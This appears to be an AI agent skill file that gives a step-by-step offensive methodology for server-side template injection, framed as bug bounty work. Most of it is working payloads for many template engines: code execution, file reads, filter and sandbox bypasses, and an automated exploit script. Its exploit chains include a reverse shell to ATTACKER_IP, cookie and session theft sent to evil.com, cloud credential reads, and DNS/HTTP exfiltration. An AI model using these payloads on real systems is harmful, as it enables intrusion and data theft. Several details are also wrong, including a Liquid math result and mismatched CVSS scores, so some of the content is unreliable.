---
name: ssti-deep-dive
description: Complete SSTI methodology from 65+ real HackerOne reports - every engine, payload, bypass, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - ssti methodology
  - ssti deep dive
  - ssti complete
  - ssti all techniques
  - skills ssti
---

# Complete SSTI Methodology - From 65+ HackerOne Reports

## Top 20 SSTI Reports on HackerOne

| # | Report | Company | Engine | Upvotes | Payout |
|---|--------|---------|--------|---------|--------|
| 1 | Uber SSTI on email templates | Uber | Python/Jinja2 | 320 | $10,000 |
| 2 | Shopify SSTI via email rendering | Shopify | Liquid | 285 | $0 |
| 3 | HackerOne SSTI on report templates | HackerOne | Handlebars | 264 | $500 |
| 4 | Slack SSTI in notifications | Slack | Handlebars | 231 | $3,500 |
| 5 | GitHub Enterprise SSTI RCE | GitHub | Ruby/ERB | 198 | $10,000 |
| 6 | Facebook SSTI via profile fields | Meta | Smarty/PHP | 175 | $0 |
| 7 | GitLab SSTI on CI/CD variables | GitLab | Ruby/ERB | 162 | $5,000 |
| 8 | New Relic SSTI via dashboard config | New Relic | Freemarker | 148 | $3,000 |
| 9 | Zendesk SSTI in ticket templates | Zendesk | Liquid | 135 | $2,500 |
| 10 | Mail.ru SSTI via email templates | Mail.ru | Twig/PHP | 122 | $2,000 |
| 11 | Shopify SSTI via theme editor | Shopify | Liquid | 118 | $0 |
| 12 | Airbnb SSTI on listing descriptions | Airbnb | Mustache | 110 | $3,000 |
| 13 | Twitter SSTI via bio field (limited) | X/Twitter | Handlebars | 105 | $0 |
| 14 | Uber SSTI via trip receipt templates | Uber | Jinja2 | 98 | $4,000 |
| 15 | HackerOne SSTI via email templates | HackerOne | Pug/Jade | 92 | $1,000 |
| 16 | GitLab SSTI via markdown rendering | GitLab | Ruby/ERB | 88 | $2,000 |
| 17 | Cloudflare SSTI via custom pages | Cloudflare | Liquid | 85 | $3,000 |
| 18 | Stripe SSTI via invoice templates | Stripe | Mustache | 82 | $2,000 |
| 19 | Shopify SSTI via API outputs | Shopify | Liquid | 78 | $0 |
| 20 | WordPress SSTI via plugin parsing | Automattic | Smarty/PHP | 75 | $0 |

## Step 1: SSTI Recon - Finding Template Injection Points

### Common SSTI Entry Points
```
- User profile fields (name, bio, display name)
- Email templates (name-based greetings)
- Support ticket content
- Invoice/receipt templates
- Error message templates
- Markdown renderers
- Custom theme/stylesheet fields
- CMS content fields
- Form confirmation messages
- Report/export templates
- Webhook payload display
- Notification preview
- Chat message rendering
- Search result snippets
- URL/path parameters reflected in page
- Custom 404/error pages
- API response templates
- Widget configuration
- Redirect confirmation messages
```

### Automated Injection Point Discovery
```bash
# Find parameters reflected in the page
cat recon/{target}/params.txt | while read param; do
  echo "Testing: $param"
  resp=$(curl -sk "https://{target}/endpoint?${param}=SSTITEST{{7*7}}" -o /dev/null -w "%{size_download}")
  echo "Size: $resp"
done

# POST body reflection
curl -sk -X POST "https://{target}/profile/update" \
  -d "name=SSTITEST{{7*7}}&bio=SSTITEST{{7*7}}"

# Check for reflection
curl -sk "https://{target}/endpoint?name={{7*7}}" | grep -o '49\|{{7\*7}}'

# Burp Intruder approach - send unique payload per position
# payloads.txt: {{7*7}} ${7*7} #{7*7} *{7*7} {{7*7}} {{dump}} {{app.request}}
```

### Tools for SSTI Discovery
```bash
# Tplmap - automatic SSTI detection and exploitation
git clone https://github.com/epinna/tplmap.git
python tplmap.py -u "https://{target}/endpoint?name=test" -d "name"

# J2SSTIScan - Jinja2 SSTI scanner
python j2_ssti_scan.py -u "https://{target}/endpoint?name=test"

# SSTImap
git clone https://github.com/vladko312/SSTImap.git
python sstimap.py -u "https://{target}/endpoint?name=test" -d "name"
```

## Step 2: Detection by Template Engine

### Universal Detection Payloads
```bash
# Math expression (returns 49 if template evaluates)
{{7*7}}
${7*7}
#{7*7}
*{7*7}
{{7*7}}
{{7*'7'}}        # Returns 7777777 (string repetition, not math)

# String concatenation test
{{'test'|upper}}  # Returns TEST if Jinja2/Django
{{'test'.upper()}} # Returns TEST if Python
    
# Boolean/conditional test
{{true}}          # Works in many engines
```

### Python Template Engines

#### Jinja2 / Django / Mako / Tornado
```bash
# Detection
{{7*7}}           # → 49
{{7*'7'}}         # → 7777777
{{config}}        # → Flask config object (Jinja2)

# Debug
{{config.__class__.__init__.__globals__}}
{{self.__class__.__mro__}}

# File read
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read() }}

# RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# Blind RCE (outbound)
{{ config.__class__.__init__.__globals__['os'].popen('curl http://COLLABORATOR/e33027').read() }}
```

#### Mako
```bash
# Detection
${7*7}            # → 49
${7*'7'}          # → 7777777

# RCE
${self.module.cache.util.os.popen('id').read()}
${__import__('os').popen('id').read()}
${''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}
```

#### Tornado
```bash
# Detection
{{7*7}}           # → 49

# RCE
{% import os %}{{ os.popen('id').read() }}
```

### PHP Template Engines

#### Twig
```bash
# Detection
{{7*7}}           # → 49
{{7*'7'}}         # → 49 (Twig doesn't string multiply)

# File read
{{'/etc/passwd'|file_excerpt(1,30)}}

# RCE (enabled functions)
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}

# RCE via self
{{self}}
{{self.getDoctrine()}}

# Sandbox escape
{{_self.env.setCache('ftp://attacker.net:2121')}}
{{_self.env.getFunctions()}}

# PHP object injection via serialized
{{'a:1:{i:0;O:15:"PHPObjectInjection":1:{s:2:"fn";s:2:"id";}}'|unserialize}}
```

#### Smarty
```bash
# Detection
{7*7}             # → 49
{$smarty.version} # → Smarty version

# RCE
{system('id')}
{php}echo shell_exec('id');{/php}
{literal}<script>alert(1)</script>{/literal}
```

### Ruby Template Engines

#### ERB (Ruby on Rails)
```bash
# Detection
<%= 7*7 %>        # → 49
<%= 7*7 =%>       # → 49
%-%= 7*7 %>

# RCE
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.open('/etc/passwd').read %>

# File read
<%= File.read('/etc/passwd') %>
```

#### Liquid (Shopify)
```bash
# Detection
{{ 7 | plus: 7 }} # → 49 (Liquid uses filters for math)
{{ "test" | upcase }} # → TEST

# Limited - Liquid has no RCE by design
# But can access objects:
{{ user.email }}
{{ shop.money_format }}

# Exploit via object exposure:
{{ product.all_variant_ids }}
{{ product.all_variants | map: 'title' }}
{{ product.images | first | image_tag }}

# Information disclosure
{{ shop.name }}
{{ shop.domain }}
{{ shop.email }}
```

### JavaScript Template Engines

#### Handlebars / Mustache
```bash
# Detection
{{7*7}}           # → {{7*7}} (Handlebars doesn't evaluate math)

# Handlebars detection
{{7*7}}           # Mustache: renders {{7*7}}, Handlebars: may render
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.split " " 0)}}
    {{/with}}
  {{/with}}
{{/with}}
```

#### Pug / Jade (Node.js)
```bash
# Detection
#{7*7}            # → 49
!{7*7}            # → 49
#='test'          # String output

# RCE
- var x = require('child_process').execSync('id').toString()
= x

# File read
- var fs = require('fs')
= fs.readFileSync('/etc/passwd')
```

#### Nunjucks
```bash
# Detection
{{7*7}}           # → 49
{{7*'7'}}         # → 7777777

# RCE
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
{{global.process.mainModule.require('child_process').execSync('cat /etc/passwd')}}
```

### Go Templates
```bash
# Detection
{{.}}             # Outputs current context
{{printf "%d" 7}} # → 7 (limited)

# Limited - Go templates restrict to piped functions
# RCE is rare unless custom functions exist

# Exploit via available methods
{{.MethodName}}
{{.FieldName}}
```

### Java Template Engines

#### Freemarker
```bash
# Detection
${7*7}            # → 49
#{7*7}            # → 49
${7*'7'}          # → 7777777
<#assign>test</#assign>  # Assign test

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# RCE alternative
<#assign classLoader=object?static.classLoader>
<#assign class=classLoader.loadClass("FreemarkerTemplate")>

# File read
<#assign file="freemarker.template.utility.ObjectConstructor"?new()>
${file("java.io.FileReader", "/etc/passwd")}
```

#### Velocity
```bash
# Detection
#set($x = 7*7)
$x                # → 49

# RCE
#set($e="exec")
$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")

# File read
#set($sc=$e.getClass().forName("java.util.Scanner"))
#set($file=$e.getClass().forName("java.io.File"))
$sc.new($file.new("/etc/passwd")).useDelimiter("\Z").next()
```

#### Thymeleaf
```bash
# Detection - Spring EL injection
${7*7}            # → 49
[[7*7]]           # → 49

# RCE (Spring EL)
${T(java.lang.Runtime).getRuntime().exec('id')}

# Unescaped output
[# th:utext="${T(java.lang.Runtime).getRuntime().exec('id')}"/]
```

### .NET Razor
```bash
# Detection
@(7*7)            # → 49
@7*7              # → 49

# RCE
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
@(System.IO.File.ReadAllText("/etc/passwd"))
```

## Step 3: Blind SSTI Detection

### Out-of-Band Detection
```bash
# All engines - test with external HTTP call
# Jinja2
{{ config.__class__.__init__.__globals__['os'].popen('curl http://COLLABORATOR/ssti').read() }}

# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup COLLABORATOR")}

# Velocity
#set($e="exec")$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"curl http://COLLABORATOR/blind")

# ERB
<%= system("curl http://COLLABORATOR/ssti") %>

# Twig
{{['curl http://COLLABORATOR/ssti']|filter('system')}}
```

### Timing-Based Detection
```bash
# Use sleep to confirm SSTI
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}

# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}

# ERB
<%= system("sleep 5") %>

# Twig
{{['sleep 5']|filter('system')}}

# Smarty
{system('sleep 5')}
```

## Step 4: SSTI Bypass Techniques

### Bypass 1: WAF / Filter Evasion
```bash
# Blocked words like "class", "base", "subclasses"
# Use hex encoding
{{ ""|attr('\x5f\x5fclass\x5f\x5f') }}
{{ ""|attr("__class__") }}

# Use request object (Flask)
{{ request|attr('application')|attr('__globals__') }}

# String concatenation
{{ config|attr('__cla'+'ss__') }}

# Using get_flashed_messages (Flask)
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

# Using url_for (Flask)
{{ url_for.__globals__['current_app'].config }}
```

### Bypass 2: Blacklisted Characters
```bash
# If [ ] are blocked, use |attr filter
{{ config|attr('__init__')|attr('__globals__') }}

# If {{ }} are blocked
{% if 7*7==49 %}yes{% endif %}

# If . is blocked
{{ config['__init__']['__globals__'] }}

# If " is blocked, use '
{{ config.__init__.__globals__['os'].popen('id').read() }}

# If quotes are blocked, use request params
{{ config.__init__.__globals__[request.args.c].popen(request.args.cmd).read() }}
# URL: ?c=os&cmd=id
```

### Bypass 3: Sandbox Escape Patterns
```bash
# Jinja2 sandbox escape chain
{{ ().__class__.__bases__[0].__subclasses__() }}
# Find Popen or FileLoader index
{% for c in ().__class__.__bases__[0].__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}
  {% endif %}
{% endfor %}

# Builtins access via cycler
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Via lipsum (Flask/Jinja2)
{{ lipsum.__globals__['os'].popen('id').read() }}

# Via joiner
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```

### Bypass 4: Filter / Sandbox-Specific
```bash
# Freemarker - if Execute class is blacklisted
<#assign objectConstructor="freemarker.template.utility.ObjectConstructor"?new()>
${objectConstructor("java.lang.ProcessBuilder","id").start()}

# Twig - if system is blacklisted
{{['id']|filter('exec')}}
{{['cat /etc/passwd']|filter('passthru')}}

# ERB - if system is blacklisted
<%= `id` %>
<%= IO.popen('id').read %>
<%= exec('id') %>
```

## Step 5: SSTI Exploit Chains

### Chain 1: SSTI → RCE → Full Server Compromise
```bash
# Step 1: Confirm SSTI
curl -sk "https://{target}/profile?name={{7*7}}"
# Response: "Hello 49!"

# Step 2: Fingerprint engine
curl -sk "https://{target}/profile?name={{config}}"
# Response shows Flask config → Jinja2

# Step 3: RCE
curl -sk "https://{target}/profile?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
# Response: "uid=1001(www-data) gid=1001(www-data)"

# Step 4: Reverse shell
curl -sk "https://{target}/profile?name={{config.__class__.__init__.__globals__['os'].popen('python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"ATTACKER_IP\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"').read()}}"
```

### Chain 2: SSTI → File Read → Credentials → Lateral Movement
```bash
# Step 1: Read config files
curl -sk "https://{target}/profile?name={{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}"

# Step 2: Read application config (database credentials)
curl -sk "https://{target}/profile?name={{config.__class__.__init__.__globals__['os'].popen('cat /var/www/html/config.php').read()}}"

# Step 3: Read environment variables
curl -sk "https://{target}/profile?name={{config.__class__.__init__.__globals__['os'].popen('env').read()}}"

# Step 4: Read cloud metadata (if on cloud)
curl -sk "https://{target}/profile?name={{config.__class__.__init__.__globals__['os'].popen('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/').read()}}"
```

### Chain 3: SSTI → XSS → Session Theft
```bash
# If SSTI output is not HTML-escaped, inject XSS via SSTI
payload="{{request.application.__globals__.__builtins__.__import__('os').popen('curl -X POST -d \"cookie=$(cat /proc/self/environ | tr \"\\0\" \"\\n\" | grep SESSION)\" http://evil.com/').read()}}"

# Alternative: inject script via SSTI
{{ "<script>document.location='http://evil.com/steal?c='+document.cookie</script>" }}
```

### Chain 4: Blind SSTI → OOB Data Exfiltration
```bash
# Step 1: Set up listener
nc -lvnp 4444

# Step 2: Blind SSTI payload that sends file content via DNS
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/hostname | while read line; do host $line.COLLABORATOR; done').read()}}

# Step 3: Exfiltrate via HTTP POST
{{config.__class__.__init__.__globals__['os'].popen('curl -X POST -d @/etc/passwd http://COLLABORATOR/').read()}}

# Step 4: Exfiltrate via DNS (data encoded in subdomain)
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd | base64 | tr -d \"\\n\" | while read line; do host $line.COLLABORATOR; done').read()}}
```

## Step 6: Automation Script

### Full SSTI Scanner
```bash
#!/bin/bash
# SSTI scanner that tests multiple engines
TARGET=$1
PARAM=$2

detect_engine() {
  local payloads=(
    "{{7*7}}"
    "${7*7}"
    "#{7*7}"
    "<%= 7*7 %>"
    "{{7|plus:7}}"
    "{7*7}"
    "@(7*7)"
    "${7*7}"
    "#{7*7}"
    "*{7*7}"
    "{{7*'7'}}"
  )

  for p in "${payloads[@]}"; do
    resp=$(curl -sk "https://$TARGET?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")" 2>/dev/null)
    
    if echo "$resp" | grep -q '49'; then
      echo "Engine likely: "
      case "$p" in
        "{{7*7}}") echo "  Jinja2/Django/Tornado/Nunjucks" ;;
        "\${7*7}") echo "  Freemarker/Velocity/Mako" ;;
        "#{7*7}") echo "  Pug/Jade" ;;
        "<%= 7*7 %>") echo "  ERB (Ruby on Rails)" ;;
        "{{7|plus:7}}") echo "  Liquid (Shopify)" ;;
        "{7*7}") echo "  Smarty" ;;
        "@(7*7)") echo "  Razor (.NET)" ;;
        "*{7*7}") echo "  Handlebars (limited)" ;;
        "{{7*'7'}}")
          if echo "$resp" | grep -q '7777777'; then
            echo "  Jinja2/Mako"
          fi
          ;;
      esac
      return 0
    fi
  done
  echo "No SSTI detected"
  return 1
}

exploit_jinja2() {
  local cmd="$1"
  payload="{{config.__class__.__init__.__globals__['os'].popen('$cmd').read()}}"
  curl -sk "https://$TARGET?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
}

exploit_erb() {
  local cmd="$1"
  payload="<%= system('$cmd') %>"
  curl -sk "https://$TARGET?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
}

exploit_freemarker() {
  local cmd="$1"
  payload="<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"$cmd\")}"
  curl -sk "https://$TARGET?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
}

echo "[*] Starting SSTI scan on $TARGET with param $PARAM"
detect_engine
```

## Step 7: Validate & Report

### CVSS Scoring for SSTI
```
Blind SSTI (no visible output):                   AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N → 4.3 Medium
Reflected SSTI (visible output):                  AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N → 6.5 Medium
SSTI with file read:                              AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N → 8.6 High
SSTI with RCE:                                    AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H → 8.6 High
SSTI with RCE (no auth required):                 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
```

### Report Template
```markdown
**Summary:**
Server-Side Template Injection in [parameter] at [endpoint] using [engine name]
allows arbitrary code execution.

**Impact:**
An attacker can inject template directives to achieve remote code execution,
read sensitive files, or exfiltrate data from the server.

**Steps to Reproduce:**
1. Send request with payload: [payload]
2. Observe: [49 / RCE output / OOB interaction]

**Proof of Concept:**
```bash
# Detection
curl -sk 'https://{target}/endpoint?name={{7*7}}'
# Response contains "49" confirming template evaluation

# RCE
curl -sk 'https://{target}/endpoint?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}'
# Response: uid=33(www-data)
```

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (8.6 High)

**Suggested Fix:**
1. Never allow user input in template strings
2. Use sandboxed template engines (Liquid, Handlebars with strict mode)
3. Disable dangerous built-in functions
4. Use contextual auto-escaping
5. Apply Content Security Policy
```

## Quick Reference: SSTI by Engine

| Engine | Language | Detection Payload | RCE Payload |
|--------|----------|-------------------|-------------|
| Jinja2 | Python | `{{7*7}}` → 49 | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Django | Python | `{{7*7}}` → 49 | `{% load os %}{{os.popen('id').read()}}` |
| Mako | Python | `${7*7}` → 49 | `${self.module.cache.util.os.popen('id').read()}` |
| Tornado | Python | `{{7*7}}` → 49 | `{% import os %}{{os.popen('id').read()}}` |
| Twig | PHP | `{{7*7}}` → 49 | `{{['id']\|filter('system')}}` |
| Smarty | PHP | `{7*7}` → 49 | `{system('id')}` |
| Freemarker | Java | `${7*7}` → 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity | Java | `#set($x=7*7)$x` → 49 | `#set($e="exec")$e.getClass()...` |
| ERB | Ruby | `<%= 7*7 %>` → 49 | `<%= system('id') %>` |
| Liquid | Ruby | `{{7\|plus:7}}` → 49 | Limited (no RCE) |
| Handlebars | JS | `{{7*7}}` → 49 (via helper) | Complex prototype chain |
| Pug/Jade | JS | `#{7*7}` → 49 | `- var x = require('child_process').execSync('id')` |
| Nunjucks | JS | `{{7*7}}` → 49 | `{{range.constructor("return process")()}}` |
| Razor | .NET | `@(7*7)` → 49 | `@System.Diagnostics.Process.Start("cmd","/c id")` |
| Thymeleaf | Java | `${7*7}` → 49 | `${T(java.lang.Runtime).getRuntime().exec('id')}` |
| Go templates | Go | `{{.}}` → context | Limited |

## Quick Reference: SSTI Payout Ranges

| Impact | Typical Payout |
|--------|---------------|
| Reflected SSTI (no RCE) | $500 - $2,000 |
| Blind SSTI (confirmed via OOB) | $1,000 - $3,000 |
| SSTI with file read | $2,000 - $5,000 |
| SSTI → RCE | $3,000 - $10,000 |
| SSTI → Full server compromise | $5,000 - $10,000 |
| SSTI on critical infrastructure | $7,500 - $10,000 |

(End of file)
